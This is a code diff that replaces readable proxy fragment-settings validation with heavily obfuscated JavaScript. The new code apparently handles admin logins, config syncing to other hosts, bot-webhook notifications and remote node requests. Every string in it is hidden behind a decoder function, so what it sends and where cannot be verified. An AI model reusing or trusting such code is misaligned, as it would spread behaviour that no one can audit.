+          [func_dec(75)]: func_dec(658),
+          [func_dec(55)]: func_dec(658),
+          [func_dec(54)]: func_dec(658),
+          [func_dec(56)]: func_dec(658),
+          [func_dec(51)]: func_dec(658),
+          [func_dec(52)]: func_dec(658),
+          [func_dec(53)]: func_dec(658),
+          [func_dec(74)]: func_dec(658)
+        } : var_d,
+        [func_dec(37)]: var_r,
+        [func_dec(659)]: var_xi,
+        [func_dec(517)]: var_xj,
+        [func_dec(660)]: var_t && var_t[func_dec(67)] ? var_t[func_dec(67)] : {},
+        [func_dec(590)]: var_a,
+        [func_dec(661)]: func_cv()[func_dec(144)](var_xx => {
+          let var_xy = var_xx[func_dec(24)] === func_dec(261) ? func_dec(3) : func_dec(521) + encodeURIComponent(var_xx[func_dec(24)]);
+          return {
+            [func_dec(24)]: var_xx[func_dec(24)],
+            [func_dec(172)]: var_xx[func_dec(172)],
+            [func_dec(26)]: func_dec(3) + var_xl + func_dec(662) + var_xk + func_dec(211) + var_d[func_dec(25)] + func_dec(3) + var_xy + func_dec(3)
+          };
+        })
+      }), {
+        [func_dec(231)]: 200
+      });
+    }
+    var_xc?.[func_dec(186)](func_al(var_xd, func_dec(663), func_dec(664) + var_xf + func_dec(3)));
+    func_cl(var_xf);
+    if (var_xc) var_xc[func_dec(186)](func_ak(var_xa, func_dec(665), var_xb));
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false
+    }), {
+      [func_dec(231)]: 401
+    });
+  } catch (var_xz) {
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false
+    }), {
+      [func_dec(231)]: 400
+    });
+  }
+}
+async function func_av(var_ya, var_yb, var_yc) {
+  try {
+    const var_yd = await var_ya[func_dec(107)]();
+    const var_ye = var_ya[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(166);
+    if (func_ck(var_ye)) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(512)
+      }), {
+        [func_dec(231)]: 429
+      });
+    }
+    const var_yf = var_yd[func_dec(163)] === var_d[func_dec(31)] || var_yd[func_dec(666)] && var_yd[func_dec(666)] === var_d[func_dec(31)] || func_ab(var_yd[func_dec(163)]) || func_ab(var_yd[func_dec(666)]) || var_yd[func_dec(667)] && var_yd[func_dec(657)] && var_yd[func_dec(657)][func_dec(31)] && var_yd[func_dec(657)][func_dec(31)] === var_d[func_dec(31)];
+    if (!var_yf) {
+      func_cl(var_ye);
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(668)
+      }), {
+        [func_dec(231)]: 401
+      });
+    }
+    if (!var_yb[func_dec(126)]) return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false,
+      [func_dec(669)]: func_dec(670)
+    }), {
+      [func_dec(231)]: 400
+    });
+    let var_yg = var_d;
+    if (var_yd[func_dec(657)]) {
+      const var_yi = var_d[func_dec(75)] || [];
+      var_yg = {
+        ...var_d,
+        ...var_yd[func_dec(657)]
+      };
+      if (Array[func_dec(161)](var_yg[func_dec(67)])) {
+        var_yg[func_dec(67)] = var_yg[func_dec(67)][func_dec(144)](var_yj => ({
+          ...var_yj
+        }));
+      }
+      if (var_yi[func_dec(135)] > 0 && (!var_yd[func_dec(657)][func_dec(75)] || var_yd[func_dec(657)][func_dec(75)][func_dec(135)] === 0)) {
+        var_yg[func_dec(75)] = var_yi;
+      }
+      func_ah(var_yg);
+      if (Array[func_dec(161)](var_yg[func_dec(67)]) && var_yg[func_dec(67)][func_dec(135)] > 0) {
+        const var_yk = var_yg[func_dec(67)][func_dec(144)](async var_yl => {
+          if (var_yl[func_dec(527)]) {
+            await func_dg(var_yl);
+          } else {
+            var_yl[func_dec(547)] = null;
+          }
+        });
+        await Promise[func_dec(132)](var_yk);
+      }
+      var_d = var_yg;
+      await func_t(var_yb, func_dec(138), JSON[func_dec(119)](var_yg));
+    }
+    let var_yh = null;
+    if (var_yg[func_dec(61)] && var_yg[func_dec(61)][func_dec(256)](func_dec(671)) && var_yg[func_dec(61)][func_dec(256)](func_dec(672))) {
+      let var_ym = func_db(var_yg[func_dec(61)]);
+      if (!var_ym[func_dec(673)]) var_yh = func_dec(674) + var_ym[func_dec(675)][func_dec(143)](func_dec(655)) + func_dec(3);
+    }
+    if (var_yd[func_dec(676)]) {
+      const var_yn = var_yd[func_dec(676)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+      if (!var_t) var_t = {
+        [func_dec(67)]: {}
+      };
+      if (!var_t[func_dec(67)]) var_t[func_dec(67)] = {};
+      if (var_t[func_dec(67)][var_yn]) {
+        var_t[func_dec(67)][var_yn][func_dec(17)] = 0;
+        var_t[func_dec(67)][var_yn][func_dec(23)] = 0;
+      } else {
+        var_t[func_dec(67)][var_yn] = {
+          [func_dec(17)]: 0,
+          [func_dec(23)]: 0,
+          [func_dec(21)]: new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0]
+        };
+      }
+      await func_t(var_yb, func_dec(139), JSON[func_dec(119)](var_t));
+    }
+    if (var_yd[func_dec(657)] && !var_yd[func_dec(667)]) {
+      let var_yo = new URL(var_ya[func_dec(206)])[func_dec(243)];
+      let var_yp = {
+        ...var_yg
+      };
+      [func_dec(54), func_dec(55), func_dec(56), func_dec(51), func_dec(52), func_dec(53), func_dec(31), func_dec(74), func_dec(25), func_dec(37), func_dec(75), func_dec(73), func_dec(72), func_dec(36), func_dec(59), func_dec(69)][func_dec(176)](var_yq => delete var_yp[var_yq]);
+      if (var_yg[func_dec(36)] && var_yg[func_dec(36)][func_dec(255)]()[func_dec(135)] > 0) {
+        let var_yr = var_yg[func_dec(36)][func_dec(18)](new RegExp(func_dec(425), func_dec(3)))[func_dec(144)](var_yt => var_yt[func_dec(255)]())[func_dec(412)](Boolean);
+        let var_ys = var_yg[func_dec(74)] || func_dec(3);
+        var_yr[func_dec(176)](var_yu => {
+          if (var_yu !== var_yo) {
+            var_yc?.[func_dec(186)](func_e(func_dec(301) + var_yu + func_dec(211) + encodeURI(var_yg[func_dec(25)]) + func_dec(217), {
+              [func_dec(123)]: func_dec(197),
+              [func_dec(104)]: {
+                [func_dec(198)]: func_dec(121)
+              },
+              [func_dec(125)]: JSON[func_dec(119)]({
+                [func_dec(163)]: var_ys,
+                [func_dec(657)]: var_yp,
+                [func_dec(667)]: true
+              })
+            })[func_dec(187)](() => {}));
+          }
+        });
+      }
+      if (var_yg[func_dec(72)] && Array[func_dec(161)](var_yg[func_dec(72)])) {
+        var_yg[func_dec(72)][func_dec(176)](var_yv => {
+          if (var_yv && var_yv[func_dec(206)] && var_yv[func_dec(402)]) {
+            let var_yw = var_yv[func_dec(206)][func_dec(255)]();
+            if (!var_yw[func_dec(299)](func_dec(300)) && !var_yw[func_dec(299)](func_dec(301))) {
+              var_yw = func_dec(301) + var_yw;
+            }
+            try {
+              const var_yx = new URL(var_yw);
+              if (var_yx[func_dec(243)] !== var_yo) {
+                var_yc?.[func_dec(186)](func_e(func_dec(3) + var_yx[func_dec(302)] + func_dec(403) + var_yx[func_dec(303)] + func_dec(211) + encodeURI(var_yg[func_dec(25)]) + func_dec(217), {
+                  [func_dec(123)]: func_dec(197),
+                  [func_dec(104)]: {
+                    [func_dec(198)]: func_dec(121)
+                  },
+                  [func_dec(125)]: JSON[func_dec(119)]({
+                    [func_dec(163)]: var_yv[func_dec(402)],
+                    [func_dec(657)]: var_yp,
+                    [func_dec(667)]: true
+                  })
+                })[func_dec(187)](() => {}));
+              }
+            } catch (var_yy) {
+              console[func_dec(511)](func_dec(677) + var_yv[func_dec(206)] + func_dec(428), var_yy);
+            }
+          }
+        });
+      }
+    }
+    if (var_yg[func_dec(51)] && var_yc) {
+      const var_yz = func_dec(301) + new URL(var_ya[func_dec(206)])[func_dec(243)] + func_dec(211) + encodeURI(var_yg[func_dec(25)]) + func_dec(219);
+      var_yc[func_dec(186)](func_e(func_dec(195) + var_yg[func_dec(51)] + func_dec(678), {
+        [func_dec(123)]: func_dec(197),
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        },
+        [func_dec(125)]: JSON[func_dec(119)]({
+          [func_dec(206)]: var_yz
+        })
+      })[func_dec(187)](() => {}));
+    }
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: true,
+      [func_dec(679)]: var_yg[func_dec(25)],
+      [func_dec(680)]: var_yh
+    }), {
+      [func_dec(231)]: 200
+    });
+  } catch (var_za) {
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false
+    }), {
+      [func_dec(231)]: 400
+    });
+  }
+}
+async function func_aw(var_zb, var_zc, var_zd) {
+  try {
+    const var_ze = await var_zb[func_dec(107)]();
+    if (!var_ze[func_dec(7)] || var_ze[func_dec(7)] !== func_dec(648)) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(681)
+      }), {
+        [func_dec(231)]: 400
+      });
+    }
+    if (!var_ze[func_dec(53)] || !var_ze[func_dec(650)]) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(682)
+      }), {
+        [func_dec(231)]: 400
+      });
+    }
+    const var_zf = var_d[func_dec(53)] || var_d[func_dec(52)];
+    if (!var_zf || var_zf[func_dec(147)]() !== var_ze[func_dec(53)][func_dec(147)]()) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(513)
+      }), {
+        [func_dec(231)]: 401
+      });
+    }
+    if (var_ze[func_dec(683)] && !func_ab(var_ze[func_dec(683)])) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(513)
+      }), {
+        [func_dec(231)]: 401
+      });
+    }
+    const var_zg = {
+      [func_dec(24)]: var_ze[func_dec(649)] || var_ze[func_dec(650)],
+      [func_dec(303)]: var_ze[func_dec(650)],
+      [func_dec(25)]: var_ze[func_dec(651)] || var_d[func_dec(25)],
+      [func_dec(646)]: false,
+      [func_dec(507)]: var_ze[func_dec(507)] || Date[func_dec(170)]()
+    };
+    if (var_zc[func_dec(126)]) {
+      var_zd?.[func_dec(186)](func_s(var_zc, func_dec(647), JSON[func_dec(119)](var_zg))[func_dec(187)](() => {}));
+    }
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: true
+    }), {
+      [func_dec(231)]: 200
+    });
+  } catch (var_zh) {
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false
+    }), {
+      [func_dec(231)]: 400
+    });
+  }
+}
+const var_ag = {
+  [func_dec(477)]: {
+    [func_dec(684)]: func_dec(685),
+    [func_dec(231)]: func_dec(686),
+    [func_dec(67)]: func_dec(687),
+    [func_dec(688)]: func_dec(689),
+    [func_dec(690)]: func_dec(691),
+    [func_dec(213)]: func_dec(692),
+    [func_dec(693)]: func_dec(694),
+    [func_dec(292)]: func_dec(695),
+    [func_dec(293)]: func_dec(696),
+    [func_dec(697)]: func_dec(698),
+    [func_dec(699)]: func_dec(700),
+    [func_dec(701)]: func_dec(702),
+    [func_dec(703)]: func_dec(704),
+    [func_dec(24)]: func_dec(705),
+    [func_dec(518)]: func_dec(706),
+    [func_dec(519)]: func_dec(707),
+    [func_dec(708)]: func_dec(709),
+    [func_dec(710)]: func_dec(711),
+    [func_dec(712)]: func_dec(713),
+    [func_dec(714)]: func_dec(715),
+    [func_dec(716)]: func_dec(717),
+    [func_dec(718)]: func_dec(719),
+    [func_dec(720)]: func_dec(721),
+    [func_dec(498)]: func_dec(722),
+    [func_dec(496)]: func_dec(723),
+    [func_dec(724)]: func_dec(725),
+    [func_dec(726)]: func_dec(727),
+    [func_dec(728)]: func_dec(729),
+    [func_dec(730)]: func_dec(731),
+    [func_dec(732)]: func_dec(733),
+    [func_dec(734)]: func_dec(735),
+    [func_dec(736)]: func_dec(737),
+    [func_dec(738)]: func_dec(739),
+    [func_dec(740)]: func_dec(741),
+    [func_dec(742)]: func_dec(743),
+    [func_dec(744)]: func_dec(745),
+    [func_dec(746)]: func_dec(747),
+    [func_dec(748)]: func_dec(749),
+    [func_dec(750)]: func_dec(751),
+    [func_dec(752)]: func_dec(753),
+    [func_dec(479)]: func_dec(754),
+    [func_dec(420)]: func_dec(755),
+    [func_dec(483)]: func_dec(756),
+    [func_dec(489)]: func_dec(757),
+    [func_dec(758)]: func_dec(759),
+    [func_dec(760)]: func_dec(761),
+    [func_dec(762)]: func_dec(763),
+    [func_dec(515)]: func_dec(764),
+    [func_dec(765)]: func_dec(766),
+    [func_dec(767)]: func_dec(768),
+    [func_dec(769)]: func_dec(770),
+    [func_dec(771)]: func_dec(772),
+    [func_dec(773)]: func_dec(774),
+    [func_dec(775)]: func_dec(776),
+    [func_dec(777)]: func_dec(778),
+    [func_dec(779)]: func_dec(780),
+    [func_dec(781)]: func_dec(782),
+    [func_dec(783)]: func_dec(784),
+    [func_dec(785)]: func_dec(292),
+    [func_dec(786)]: func_dec(293),
+    [func_dec(787)]: func_dec(516),
+    [func_dec(788)]: func_dec(789),
+    [func_dec(790)]: func_dec(791),
+    [func_dec(792)]: func_dec(793),
+    [func_dec(794)]: func_dec(795),
+    [func_dec(796)]: func_dec(797),
+    [func_dec(798)]: func_dec(799),
+    [func_dec(800)]: func_dec(801),
+    [func_dec(802)]: func_dec(803),
+    [func_dec(804)]: func_dec(805),
+    [func_dec(806)]: func_dec(807),
+    [func_dec(808)]: func_dec(809),
+    [func_dec(810)]: func_dec(811),
+    [func_dec(812)]: func_dec(813),
+    [func_dec(814)]: func_dec(815),
+    [func_dec(816)]: func_dec(817),
+    [func_dec(818)]: func_dec(819),
+    [func_dec(820)]: func_dec(821),
+    [func_dec(822)]: func_dec(823),
+    [func_dec(824)]: func_dec(825),
+    [func_dec(826)]: func_dec(827),
+    [func_dec(828)]: func_dec(829),
+    [func_dec(830)]: func_dec(831),
+    [func_dec(486)]: func_dec(832),
+    [func_dec(833)]: func_dec(834),
+    [func_dec(835)]: func_dec(836),
+    [func_dec(837)]: func_dec(838),
+    [func_dec(839)]: func_dec(840),
+    [func_dec(841)]: func_dec(842),
+    [func_dec(843)]: func_dec(844),
+    [func_dec(845)]: func_dec(846),
+    [func_dec(847)]: func_dec(848),
+    [func_dec(849)]: func_dec(850),
+    [func_dec(851)]: func_dec(852),
+    [func_dec(853)]: func_dec(854),
+    [func_dec(855)]: func_dec(856),
+    [func_dec(857)]: func_dec(858),
+    [func_dec(859)]: func_dec(644),
+    [func_dec(860)]: func_dec(861),
+    [func_dec(862)]: func_dec(863),
+    [func_dec(864)]: func_dec(865),
+    [func_dec(866)]: func_dec(867),
+    [func_dec(868)]: func_dec(869),
+    [func_dec(870)]: func_dec(871),
+    [func_dec(872)]: func_dec(873),
+    [func_dec(874)]: func_dec(875),
+    [func_dec(876)]: func_dec(877),
+    [func_dec(878)]: func_dec(879),
+    [func_dec(880)]: func_dec(881),
+    [func_dec(882)]: func_dec(883),
+    [func_dec(884)]: func_dec(885),
+    [func_dec(886)]: func_dec(887),
+    [func_dec(888)]: func_dec(889),
+    [func_dec(890)]: func_dec(891),
+    [func_dec(892)]: func_dec(893),
+    [func_dec(894)]: func_dec(895),
+    [func_dec(896)]: func_dec(897),
+    [func_dec(898)]: func_dec(899),
+    [func_dec(900)]: func_dec(901),
+    [func_dec(902)]: func_dec(903),
+    [func_dec(904)]: func_dec(905),
+    [func_dec(906)]: func_dec(3),
+    [func_dec(907)]: func_dec(908),
+    [func_dec(909)]: func_dec(910),
+    [func_dec(911)]: func_dec(881),
+    [func_dec(912)]: func_dec(913),
+    [func_dec(914)]: func_dec(883),
+    [func_dec(915)]: func_dec(879),
+    [func_dec(916)]: func_dec(917),
+    [func_dec(918)]: func_dec(854),
+    [func_dec(919)]: func_dec(920),
+    [func_dec(921)]: func_dec(922),
+    [func_dec(923)]: func_dec(924),
+    [func_dec(925)]: func_dec(926),
+    [func_dec(927)]: func_dec(928),
+    [func_dec(929)]: func_dec(698),
+    [func_dec(930)]: func_dec(931),
+    [func_dec(932)]: func_dec(933),
+    [func_dec(934)]: func_dec(935)
+  },
+  [func_dec(66)]: {
+    [func_dec(684)]: func_dec(936),
+    [func_dec(231)]: func_dec(937),
+    [func_dec(67)]: func_dec(938),
+    [func_dec(688)]: func_dec(939),
+    [func_dec(690)]: func_dec(940),
+    [func_dec(213)]: func_dec(941),
+    [func_dec(693)]: func_dec(942),
+    [func_dec(292)]: func_dec(943),
+    [func_dec(293)]: func_dec(944),
+    [func_dec(697)]: func_dec(945),
+    [func_dec(699)]: func_dec(946),
+    [func_dec(701)]: func_dec(947),
+    [func_dec(703)]: func_dec(948),
+    [func_dec(24)]: func_dec(949),
+    [func_dec(518)]: func_dec(950),
+    [func_dec(519)]: func_dec(951),
+    [func_dec(708)]: func_dec(952),
+    [func_dec(710)]: func_dec(953),
+    [func_dec(712)]: func_dec(954),
+    [func_dec(714)]: func_dec(955),
+    [func_dec(716)]: func_dec(956),
+    [func_dec(718)]: func_dec(957),
+    [func_dec(720)]: func_dec(958),
+    [func_dec(498)]: func_dec(959),
+    [func_dec(496)]: func_dec(960),
+    [func_dec(724)]: func_dec(961),
+    [func_dec(726)]: func_dec(962),
+    [func_dec(728)]: func_dec(963),
+    [func_dec(730)]: func_dec(964),
+    [func_dec(732)]: func_dec(965),
+    [func_dec(734)]: func_dec(966),
+    [func_dec(736)]: func_dec(967),
+    [func_dec(738)]: func_dec(968),
+    [func_dec(740)]: func_dec(969),
+    [func_dec(742)]: func_dec(970),
+    [func_dec(744)]: func_dec(971),
+    [func_dec(746)]: func_dec(972),
+    [func_dec(748)]: func_dec(973),
+    [func_dec(750)]: func_dec(974),
+    [func_dec(752)]: func_dec(975),
+    [func_dec(479)]: func_dec(976),
+    [func_dec(420)]: func_dec(977),
+    [func_dec(483)]: func_dec(978),
+    [func_dec(489)]: func_dec(979),
+    [func_dec(758)]: func_dec(980),
+    [func_dec(760)]: func_dec(981),
+    [func_dec(762)]: func_dec(982),
+    [func_dec(515)]: func_dec(983),
+    [func_dec(765)]: func_dec(984),
+    [func_dec(767)]: func_dec(985),
+    [func_dec(769)]: func_dec(986),
+    [func_dec(771)]: func_dec(987),
+    [func_dec(773)]: func_dec(988),
+    [func_dec(775)]: func_dec(989),
+    [func_dec(777)]: func_dec(990),
+    [func_dec(779)]: func_dec(991),
+    [func_dec(781)]: func_dec(992),
+    [func_dec(783)]: func_dec(993),
+    [func_dec(785)]: func_dec(994),
+    [func_dec(786)]: func_dec(995),
+    [func_dec(787)]: func_dec(996),
+    [func_dec(788)]: func_dec(997),
+    [func_dec(790)]: func_dec(994),
+    [func_dec(792)]: func_dec(995),
+    [func_dec(794)]: func_dec(998),
+    [func_dec(796)]: func_dec(996),
+    [func_dec(798)]: func_dec(999),
+    [func_dec(800)]: func_dec(1000),
+    [func_dec(802)]: func_dec(1001),
+    [func_dec(804)]: func_dec(1002),
+    [func_dec(806)]: func_dec(1003),
+    [func_dec(808)]: func_dec(1004),
+    [func_dec(810)]: func_dec(1005),
+    [func_dec(812)]: func_dec(1006),
+    [func_dec(814)]: func_dec(1007),
+    [func_dec(816)]: func_dec(1008),
+    [func_dec(818)]: func_dec(1009),
+    [func_dec(820)]: func_dec(1010),
+    [func_dec(822)]: func_dec(1011),
+    [func_dec(824)]: func_dec(825),
+    [func_dec(826)]: func_dec(1012),
+    [func_dec(828)]: func_dec(1013),
+    [func_dec(830)]: func_dec(1014),
+    [func_dec(486)]: func_dec(1004),
+    [func_dec(833)]: func_dec(1015),
+    [func_dec(835)]: func_dec(1016),
+    [func_dec(837)]: func_dec(1017),
+    [func_dec(839)]: func_dec(1018),
+    [func_dec(841)]: func_dec(1019),
+    [func_dec(843)]: func_dec(1020),
+    [func_dec(845)]: func_dec(1021),
+    [func_dec(847)]: func_dec(1022),
+    [func_dec(849)]: func_dec(1023),
+    [func_dec(851)]: func_dec(1024),
+    [func_dec(853)]: func_dec(1025),
+    [func_dec(855)]: func_dec(1026),
+    [func_dec(857)]: func_dec(1027),
+    [func_dec(859)]: func_dec(1028),
+    [func_dec(860)]: func_dec(861),
+    [func_dec(862)]: func_dec(1029),
+    [func_dec(864)]: func_dec(1030),
+    [func_dec(866)]: func_dec(867),
+    [func_dec(868)]: func_dec(869),
+    [func_dec(870)]: func_dec(1031),
+    [func_dec(872)]: func_dec(1032),
+    [func_dec(874)]: func_dec(1033),
+    [func_dec(876)]: func_dec(1034),
+    [func_dec(878)]: func_dec(879),
+    [func_dec(880)]: func_dec(1035),
+    [func_dec(882)]: func_dec(1036),
+    [func_dec(884)]: func_dec(1037),
+    [func_dec(886)]: func_dec(1038),
+    [func_dec(888)]: func_dec(1039),
+    [func_dec(890)]: func_dec(1040),
+    [func_dec(892)]: func_dec(1041),
+    [func_dec(894)]: func_dec(1042),
+    [func_dec(896)]: func_dec(1043),
+    [func_dec(898)]: func_dec(1044),
+    [func_dec(900)]: func_dec(1045),
+    [func_dec(902)]: func_dec(1046),
+    [func_dec(904)]: func_dec(1047),
+    [func_dec(906)]: func_dec(3),
+    [func_dec(907)]: func_dec(1048),
+    [func_dec(909)]: func_dec(1049),
+    [func_dec(911)]: func_dec(1035),
+    [func_dec(912)]: func_dec(1050),
+    [func_dec(914)]: func_dec(1036),
+    [func_dec(915)]: func_dec(879),
+    [func_dec(916)]: func_dec(1024),
+    [func_dec(918)]: func_dec(1025),
+    [func_dec(919)]: func_dec(1051),
+    [func_dec(921)]: func_dec(1052),
+    [func_dec(923)]: func_dec(1053),
+    [func_dec(925)]: func_dec(1054),
+    [func_dec(927)]: func_dec(1055),
+    [func_dec(929)]: func_dec(945),
+    [func_dec(930)]: func_dec(1056),
+    [func_dec(932)]: func_dec(1057),
+    [func_dec(934)]: func_dec(1058)
+  }
+};
+function func_ax() {
+  const var_zi = [];
+  var_zi[func_dec(429)]({
+    [func_dec(24)]: var_d[func_dec(24)] || func_dec(1059),
+    [func_dec(303)]: null,
+    [func_dec(25)]: var_d[func_dec(25)],
+    [func_dec(402)]: null,
+    [func_dec(646)]: true
+  });
+  if (var_d[func_dec(72)] && Array[func_dec(161)](var_d[func_dec(72)])) {
+    var_d[func_dec(72)][func_dec(176)](var_zj => {
+      if (var_zj && var_zj[func_dec(303)]) {
+        var_zi[func_dec(429)]({
+          [func_dec(24)]: var_zj[func_dec(24)] || var_zj[func_dec(303)],
+          [func_dec(303)]: var_zj[func_dec(303)],
+          [func_dec(25)]: var_zj[func_dec(25)] || var_d[func_dec(25)],
+          [func_dec(402)]: var_zj[func_dec(402)] || var_zj[func_dec(31)] || null,
+          [func_dec(646)]: false
+        });
+      }
+    });
+  }
+  return var_zi;
+}
+async function func_ay(var_zk, var_zl, var_zm, var_zn = null) {
+  try {
+    const var_zo = func_dec(301) + var_zk[func_dec(303)] + func_dec(211) + encodeURI(var_zk[func_dec(25)]) + func_dec(3) + var_zm + func_dec(3);
+    const var_zp = {
+      [func_dec(123)]: var_zl,
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    };
+    if (var_zn) var_zp[func_dec(125)] = JSON[func_dec(119)](var_zn);
+    const var_zq = await func_e(var_zo, {
+      ...var_zp,
+      [func_dec(7)]: AbortSignal[func_dec(90)](8000)
+    });
+    return await var_zq[func_dec(107)]();
+  } catch (var_zr) {
+    return {
+      [func_dec(108)]: false,
+      [func_dec(511)]: var_zr[func_dec(410)]
+    };
+  }
+}
+async function func_az(var_zs) {
+  return await func_ay(var_zs, func_dec(253), func_dec(1060) + encodeURIComponent(var_zs[func_dec(402)]) + func_dec(3));
+}
+async function func_ba(var_zt, var_zu) {
+  return await func_ay(var_zt, func_dec(253), func_dec(1061) + encodeURIComponent(var_zu) + func_dec(1062) + encodeURIComponent(var_zt[func_dec(402)]) + func_dec(3));
+}
+async function func_bb(var_zv) {
+  return await func_ay(var_zv, func_dec(253), func_dec(1063) + encodeURIComponent(var_zv[func_dec(402)]) + func_dec(3));
+}
+async function func_bc(var_zw) {
+  return await func_ay(var_zw, func_dec(197), func_dec(216), {
+    [func_dec(163)]: var_zw[func_dec(402)]
+  });
+}
+async function func_bd(var_zx, var_zy, var_zz, var_aaa = null) {
+  let var_aab = func_dec(224);
+  if (var_zz) var_aab += func_dec(1064) + encodeURIComponent(var_zz) + func_dec(1062) + encodeURIComponent(var_zx[func_dec(402)]) + func_dec(3);else var_aab += func_dec(1065) + encodeURIComponent(var_zx[func_dec(402)]) + func_dec(3);
+  return await func_ay(var_zx, var_zy, var_aab, var_aaa || {
+    [func_dec(163)]: var_zx[func_dec(402)]
+  });
+}
+async function func_be(var_aac, var_aad) {
+  return await func_ay(var_aac, func_dec(197), func_dec(1061) + encodeURIComponent(var_aad) + func_dec(1066) + encodeURIComponent(var_aac[func_dec(402)]) + func_dec(3));
+}
+async function func_bf(var_aae, var_aaf) {
+  return await func_ay(var_aae, func_dec(197), func_dec(1061) + encodeURIComponent(var_aaf) + func_dec(1067) + encodeURIComponent(var_aae[func_dec(402)]) + func_dec(3));
+}
+async function func_bg(var_aag, var_aah, var_aai, var_aaj) {
+  try {
+    const var_aak = await var_aag[func_dec(107)]();
+    const var_aal = func_dec(195) + var_d[func_dec(51)] + func_dec(3);
+    const var_aam = var_d[func_dec(65)] || func_dec(66);
+    const func_eh = var_aat => var_ag[var_aam]?.[var_aat] || var_ag[func_dec(477)]?.[var_aat] || var_aat;
+    const var_aan = var_aak[func_dec(1068)]?.[func_dec(417)]?.[func_dec(172)]?.[func_dec(147)]() || var_aak[func_dec(410)]?.[func_dec(417)]?.[func_dec(172)]?.[func_dec(147)]();
+    const var_aao = var_d[func_dec(53)] || var_d[func_dec(52)];
+    const var_aap = var_aao && var_aan === var_aao[func_dec(147)]();
+    if (!var_aap) {
+      const var_aau = var_aak[func_dec(1068)]?.[func_dec(410)]?.[func_dec(1069)]?.[func_dec(172)] || var_aak[func_dec(410)]?.[func_dec(1069)]?.[func_dec(172)];
+      if (var_aau) {
+        await func_e(func_dec(3) + var_aal + func_dec(196), {
+          [func_dec(123)]: func_dec(197),
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          },
+          [func_dec(125)]: JSON[func_dec(119)]({
+            [func_dec(199)]: var_aau,
+            [func_dec(200)]: func_dec(1070) + (var_aan || func_dec(166)) + func_dec(1071),
+            [func_dec(201)]: func_dec(502)
+          })
+        });
+      }
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(513)
+      }), {
+        [func_dec(231)]: 200
+      });
+    }
+    let var_aaq = {};
     try {
-        if (!p) return null;
-        const mode = String(p.segMode || "off").toLowerCase();
-        if (mode === "builder") {
-            const packets = String(p.segPackets || "").trim().slice(0, 32);
-            if (!packets) return null;
-            if (
-                packets !== "tlshello" &&
-                !/^\d{1,3}-\d{1,3}$/.test(packets)
-            )
-                return null;
-            const lengths = parseSegRangeList(p.segLengths, 8);
-            const delays = parseSegRangeList(p.segDelays, 8);
-            const maxSplit = String(p.segMaxSplit ?? "").trim();
-            if (!lengths || !delays) return null;
-            if (!/^\d{1,6}$/.test(maxSplit)) return null;
-            return {
-                kind: "fm",
-                value: {
-                    tcp: [
-                        {
-                            type: "fragment",
-                            settings: { packets, lengths, delays, maxSplit },
-                        },
-                    ],
-                },
+      const var_aav = await func_r(var_aah, func_dec(1072));
+      if (var_aav) var_aaq = JSON[func_dec(388)](var_aav);
+    } catch (var_aaw) {}
+    const var_aar = func_ax();
+    let var_aas = null;
+    try {
+      const var_aax = await func_r(var_aah, func_dec(647));
+      if (var_aax) var_aas = JSON[func_dec(388)](var_aax);
+    } catch (var_aay) {}
+    const func_ei = () => {
+      if (var_aas) {
+        if (var_aas[func_dec(646)]) return var_aar[func_dec(260)](var_aba => var_aba[func_dec(646)]) || var_aar[0];
+        const var_aaz = var_aar[func_dec(260)](var_abb => !var_abb[func_dec(646)] && var_abb[func_dec(303)] === var_aas[func_dec(303)]);
+        if (var_aaz) return var_aaz;
+        return {
+          [func_dec(24)]: var_aas[func_dec(24)] || var_aas[func_dec(303)],
+          [func_dec(303)]: var_aas[func_dec(303)],
+          [func_dec(25)]: var_aas[func_dec(25)] || var_d[func_dec(25)],
+          [func_dec(402)]: var_aas[func_dec(402)] || var_aas[func_dec(31)] || null,
+          [func_dec(646)]: false
+        };
+      }
+      return var_aar[0];
+    };
+    const func_ej = async (var_abc, var_abd, var_abe = null, var_abf = null) => {
+      let var_abg;
+      if (var_abf) {
+        var_abg = await func_e(func_dec(3) + var_aal + func_dec(1073), {
+          [func_dec(123)]: func_dec(197),
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          },
+          [func_dec(125)]: JSON[func_dec(119)]({
+            [func_dec(199)]: var_abc,
+            [func_dec(1074)]: var_abf,
+            [func_dec(200)]: var_abd,
+            [func_dec(201)]: func_dec(502),
+            [func_dec(503)]: var_abe
+          })
+        });
+        if (var_abg[func_dec(394)]) return var_abg;
+        try {
+          const var_abh = await var_abg[func_dec(107)]();
+          if (var_abh?.[func_dec(1075)]?.[func_dec(256)](func_dec(1076))) return var_abg;
+        } catch (var_abi) {}
+      }
+      var_abg = await func_e(func_dec(3) + var_aal + func_dec(196), {
+        [func_dec(123)]: func_dec(197),
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        },
+        [func_dec(125)]: JSON[func_dec(119)]({
+          [func_dec(199)]: var_abc,
+          [func_dec(200)]: var_abd,
+          [func_dec(201)]: func_dec(502),
+          [func_dec(503)]: var_abe
+        })
+      });
+      return var_abg;
+    };
+    const func_ek = (var_abj, var_abk = true) => {
